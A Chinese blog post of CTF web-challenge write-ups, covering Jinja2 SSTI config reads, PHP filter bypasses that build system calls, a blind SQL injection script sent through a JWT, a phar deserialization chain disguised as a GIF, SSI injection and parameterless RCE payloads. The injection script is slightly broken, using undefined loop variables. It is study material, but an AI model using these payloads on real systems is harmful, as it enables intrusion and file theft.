---
title: CTFHUB刷题记录
date: 2020-12-14 19:47:39
tags: CTFHUB
---

## 一 [WesternCTF2018]shrine

![](https://i.loli.net/2020/12/14/aEo3HiGK7nINcx8.png)

没什么好说的，SSTI模版注入类问题，过滤了`()`但是我们不慌。开始注入，`{{29*3}}`测试通过。

发现是jinjia2的模版注入。关键点在于没有`（）`，并且还要获取config文件，就可以获取到flag。

 总结几种常用的读取`config`语句

```
1.{{config}} 
2.{{self.__dict__}}
如果config和self和()都不能使用，就必须找到config的上层current_app
1.url_for.__globals__['current_app'].config['FLAG']
2.get_flashed_messages.__globals__['current_app'].config['FLAG']
```

## 二 2017-赛客夏令营-Web-Injection V2.0

![image-20201214202244996](https://i.loli.net/2020/12/14/voeR3SKpTdCXtqP.png)

十分简洁的一个界面，但是依然抵挡不住他这道题有多骚。

首先，我们得明白，登陆有两种方式

1. `select * from users where username = {$username} and password = {$password}`

2. `$a  = select password from users where username = {$username}; $a == {$password}`

这是两种常用的登陆模版，当然好像还有一种比较骚的，但是在语雀笔记上，注意看他的返回字符提醒

![image-20201214202621995](https://i.loli.net/2020/12/14/5z4empQgtryTGVa.png)

这道题会返回用户不存在，很明显就是我们的第一种注册方式（当然还有可能就是这道题只允许admin登陆。还有时间盲注猜，等等。

## 三 第五空间大赛-hate_php

![image-20201214203738444](https://i.loli.net/2020/12/14/yeJLXlI4fknNPMb.png)

这里主要是绕过，他对于内置函数的限制。

这里其实就有两种的bypass的方法

**1.取反或异或绕过**

```
通过(phpinfo)()这种 来进行函数的执行
```

**2.字符串的拼接**

```
$a="syste";$b="m(%27cat%20flag.php%27);";$c=$a.$b;eval($c);
```

**无字母getshell（限制长度）参考链接**:https://www.cnblogs.com/wangtanzhi/p/12251619.html#autoid-0-1-0

各种php__rce：https://bbs.ichunqiu.com/thread-59273-1-1.html

![image-20201214205716339](https://i.loli.net/2020/12/14/5h12dpSisg4cf9O.png)

简单贴个脚本备用:

```python
import urllib.parse
find = ['G','E','T','_']//这里没有顺序
for i in range(1,256):
    for j in range(1,256):
        result = chr(i^j)
        if(result in find):
            a = i.to_bytes(1,byteorder='big')
            b = j.to_bytes(1,byteorder='big')
            a = urllib.parse.quote(a)
            b = urllib.parse.quote(b)
            print("%s:%s^%s"%(result,a,b))
```

## 四 2020-RCTF-Web-calc

![image-20201214205512805](https://i.loli.net/2020/12/14/7aldUhBmoLSYQPi.png)

屏蔽了一些字母和**不可见字符**，还有一些乱七八糟的东西。跟上面的题类似，不论怎么搞，直接胡乱撸他就完事了。我们取反之后就是一群不可见字符。（划走ing

这里就又有一个小trick

```php
<?php
$a = ((1/0).(1));
var_dump($a{0});
?>
```

这里输出的字符是`I`原理是php是`弱类型`的语言（nodejs就没有这么简单艹）



```php
$cmd = "phpinfo";#要运行的命令
$fin="";
$tables=
    [
        "9" => "(((9).(0)){0})",
        "8" => "(((8).(0)){0})",
        "7" => "(((7).(0)){0})",
        "6" => "(((6).(0)){0})",
        "5" => "(((5).(0)){0})",
        "4" => "(((4).(0)){0})",
        "3" => "(((3).(0)){0})",
        "2" => "(((2).(0)){0})",
        "1" => "(((1).(0)){0})",
        "0" => "(((0).(0)){0})",
        "~" => "((((0).(0)){0})|(((0/0).(0)){0}))",
        "}" => "((((4).(0)){0})|(((1/0).(0)){0}))",
        "|" => "((((4).(0)){0})|((((0/0).(0)){0})&(((1/0).(0)){0})))",
        "{" => "((((2).(0)){0})|(((1/0).(0)){0}))",
        "z" => "((((2).(0)){0})|((((0/0).(0)){0})&(((1/0).(0)){0})))",
        "y" => "((((0).(0)){0})|(((1/0).(0)){0}))",
        "x" => "((((0).(0)){0})|((((0/0).(0)){0})&(((1/0).(0)){0})))",
        "w" => "((((1).(0)){0})|(((1/0).(0)){2}))",
        "v" => "((((0).(0)){0})|(((1/0).(0)){2}))",
        "u" => "((((4).(0)){0})|(((0/0).(0)){1}))",
        "t" => "((((4).(0)){0})|((((0/0).(0)){0})&(((0/0).(0)){1})))",
        "s" => "((((2).(0)){0})|(((0/0).(0)){1}))",
        "r" => "((((2).(0)){0})|((((0/0).(0)){0})&(((0/0).(0)){1})))",
        "q" => "((((0).(0)){0})|(((0/0).(0)){1}))",
        "p" => "((((0).(0)){0})|((((0/0).(0)){0})&(((0/0).(0)){1})))",
        "o" => "((((0/0).(0)){0})|(((-1).(1)){0}))",
        "n" => "((((0/0).(0)){0})|((((4).(0)){0})&(((-1).(1)){0})))",
        "m" => "((((0/0).(0)){1})|(((-1).(1)){0}))",
        "l" => "(((((0).(0)){0})|(((0/0).(0)){0}))&((((0/0).(0)){1})|(((-1).(1)){0})))",
        "k" => "(((((2).(0)){0})|(((1/0).(0)){0}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "j" => "(((((0).(0)){0})|(((0/0).(0)){0}))&(((((2).(0)){0})|(((1/0).(0)){0}))&((((0/0).(0)){0})|(((-1).(1)){0}))))",
        "i" => "((((0/0).(0)){1})|((((8).(0)){0})&(((-1).(1)){0})))",
        "h" => "(((((8).(0)){0})&(((-1).(1)){0}))|((((0/0).(0)){0})&(((0/0).(0)){1})))",
        "g" => "((((1/0).(0)){2})|((((1).(0)){0})&(((-1).(1)){0})))",
        "f" => "((((1/0).(0)){2})|((((4).(0)){0})&(((-1).(1)){0})))",
        "e" => "((((0/0).(0)){1})|((((4).(0)){0})&(((-1).(1)){0})))",
        "d" => "(((((0).(0)){0})|(((1/0).(0)){2}))&((((0/0).(0)){1})|(((-1).(1)){0})))",
        "c" => "(((((2).(0)){0})|(((0/0).(0)){1}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "b" => "(((((0).(0)){0})|(((0/0).(0)){0}))&(((((2).(0)){0})|(((0/0).(0)){1}))&((((0/0).(0)){0})|(((-1).(1)){0}))))",
        "a" => "((((0/0).(0)){1})|((((1).(0)){0})&(((-1).(1)){0})))",
        "`" => "(((((0).(0)){0})|(((0/0).(0)){0}))&((((0/0).(0)){1})|((((1).(0)){0})&(((-1).(1)){0}))))",
        "O" => "((((0/0).(0)){0})|(((0/0).(0)){1}))",
        "N" => "(((0/0).(0)){0})",
        "M" => "(((((4).(0)){0})|(((1/0).(0)){0}))&((((0/0).(0)){0})|(((0/0).(0)){1})))",
        "L" => "((((0/0).(0)){0})&((((4).(0)){0})|(((1/0).(0)){0})))",
        "K" => "(((((2).(0)){0})|(((1/0).(0)){0}))&((((0/0).(0)){0})|(((0/0).(0)){1})))",
        "J" => "((((0/0).(0)){0})&((((2).(0)){0})|(((1/0).(0)){0})))",
        "I" => "(((1/0).(0)){0})",
        "H" => "((((0/0).(0)){0})&(((1/0).(0)){0}))",
        "G" => "((((0/0).(0)){1})|(((1/0).(0)){2}))",
        "F" => "(((1/0).(0)){2})",
        "E" => "(((((4).(0)){0})|(((0/0).(0)){1}))&((((0/0).(0)){0})|(((0/0).(0)){1})))",
        "D" => "((((0/0).(0)){0})&((((4).(0)){0})|(((0/0).(0)){1})))",
        "C" => "(((((2).(0)){0})|(((0/0).(0)){1}))&((((0/0).(0)){0})|(((0/0).(0)){1})))",
        "B" => "((((0/0).(0)){0})&((((2).(0)){0})|(((0/0).(0)){1})))",
        "A" => "(((0/0).(0)){1})",
        "@" => "((((0/0).(0)){0})&(((0/0).(0)){1}))",
        "?" => "((((2).(0)){0})|(((-1).(1)){0}))",
        ">" => "((((6).(0)){0})|(((8).(0)){0}))",
        "=" => "((((0).(0)){0})|(((-1).(1)){0}))",
        "<" => "((((4).(0)){0})|(((8).(0)){0}))",
        ";" => "((((2).(0)){0})|(((9).(0)){0}))",
        ":" => "((((2).(0)){0})|(((8).(0)){0}))",
        "/" => "(((((2).(0)){0})|(((-1).(1)){0}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "." => "(((((6).(0)){0})|(((8).(0)){0}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "-" => "(((-1).(1)){0})",
        "," => "((((-1).(1)){0})&((((0).(0)){0})|(((0/0).(0)){0})))",
        "+" => "(((((2).(0)){0})|(((9).(0)){0}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "*" => "(((((2).(0)){0})|(((8).(0)){0}))&((((0/0).(0)){0})|(((-1).(1)){0})))",
        ")" => "((((9).(0)){0})&(((-1).(1)){0}))",
        "(" => "((((8).(0)){0})&(((-1).(1)){0}))",
        "'" => "((((7).(0)){0})&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "&" => "((((6).(0)){0})&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "%" => "((((5).(0)){0})&(((-1).(1)){0}))",
        "$" => "((((4).(0)){0})&(((-1).(1)){0}))",
        "#" => "((((3).(0)){0})&((((0/0).(0)){0})|(((-1).(1)){0})))",
        '"' => "((((2).(0)){0})&((((0/0).(0)){0})|(((-1).(1)){0})))",
        "!" => "((((1).(0)){0})&(((-1).(1)){0}))"
    ];
for($i=0;$i<strlen($cmd);$i++) {
    $fin = $fin.$tables[$cmd[$i]].'.';
}
echo substr($fin,0,strlen($fin)-1);
```

这里再借助上面的`(phpinfo)()`来进行完美的绕过。

**小trcik**:`nmap 可以直接读取文件 -il参数`

## 五  js_on

弱口令登陆

![image-20201214210908100](https://i.loli.net/2020/12/14/KOgCqtW1juFmEdo.png)

这个key，让我不得不看一下我的jwt

![](https://i.loli.net/2020/12/14/KOgCqtW1juFmEdo.png)

然后

![image-20201214211207532](https://i.loli.net/2020/12/14/Dm6xYGpkjEoCy2J.png)

这里我的第一反应其实是xss或者ssti注入

结果是一道盲注，我确实是没有想到这道题是这个骚做法。（联系一下开放的注册端口，应该是注入，应该是注入，还有过滤空格，select这些，骚呀。

```
#!/usr/bin/python python3
#-*-coding:utf-8-*-
#CTF_2020网鼎杯_玄武组_Web题_js_on


import requests,jwt,time

url='http://f3837049ec024ba1a59616045d15741a29b3253216334191.cloudgame1.ichunqiu.com/'
key = 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6'

flag = ''

for i1 in range(1,50):
    for i2 in range(33,127):
        time_start = time.time()

        #生成组装jwt,放入data，发出请求
        user = '1234\'or/**/1=if(ord(substr((sele<>ct/**/load_file(\'//flag\')),'+str(a)+',1))='+str(i)+',sl<>eep(5),1)#'
        encoded_jwt = jwt.encode({'user':user,'news':'1234'},key,algorithm='HS256')
        data={ 'Cookie':'token='+str(encoded_jwt)}
        res=requests.get(url,data=data)      

        if time.time() - time_start > 5:
            flag += chr(i2)
            print(flag)
```

## 六 picdown

有下载页面的十拿九稳的文件包含，然后介绍几个常用的文件夹（学习linux牛鼻）

`../../../../../proc/self/cmdline`查看当前正在执行的任务命令

常用的proc目录：https://blog.csdn.net/shenhuxi_yu/article/details/79697792

`/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接`**open**打开了文件，创建文件描述符

然后后面就是无脑拼命令。

## 七 国赛 love_math

重点就在于`hex2bin`这个函数了，其他就是新建变量这些操作了。

## 八 国赛 CISCN-2019-华北赛区-Day2-Web-Web1

括号绕空格，这些基础操作了。

## 九 CISCN-2019-华北赛区-Day1-Web-Web1

文件下载是入后，发现源码泄漏的入口，进行源码的获取，然后代码审计。

![image-20201214212500959](https://i.loli.net/2020/12/14/pVcA3OiReqyFQ9K.png)

审计代码，构建pop链子就好了，当然离不开这些骚骚的协议了。最骚的上传文件和绕过，离不开我的phar协议，无视后缀，无视操作，只要有协议用。（巅峰极客的wp）

放上链接：https://xz.aliyun.com/t/2715

贴个脚本（前面的反序列自己搞定。

```
<?php

class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public $backup;
    public function __construct()
    {
        $this->nickname = new Reader();
        $this->backup = "/flag";
    }
}
class dbCtrl
{
    public $token;
    public function __construct()
    {
        $this->token = new User;
    }
}

Class Reader{
    public $filename;
    public $result;
}

$y1ng = new dbCtrl();

$phar = new Phar("web1.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($y1ng);//这是数据
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

@rename("web1.phar", "y1ng.gif");
```

```
compress.zlib://phar://ying.gif/test.txt
```

这样联合绕过协议的限制，它不香吗？

## 十 BJDCTF-2020-Web-Cookie is so subtle!

这里就是一个错觉，有几个点（原题，又忘了。。。

1.cookie中数据不需要url编码传输

2.SSI的注入

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

文件写入，再加上**SHTML**的特征基本就是`SSI注入`了

`SSTI xss SSI` 等等命令

## 十一 ByteCTF 2019 –WEB- Boring-Code

parse_url的绕过:https://www.jianshu.com/p/80ce73919edb

然后就是无参数的乱杀了。

贴上几个payload（效果是读取上层目录

构建ascii的46，构建出`.`

```
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));
```

```
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
```

exp：

```
import requests
import time
localtime = time.asctime( time.localtime(time.time()) )
url='http://challenge-72b9ac351e12c91b.sandbox.ctfhub.com:10080/code/'
while 1:
    response=requests.post(url,data={'url':'compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));'}).text
    if 'ctfhub' in response:
        print('flag:'+response+"\n",localtime)
        break
```

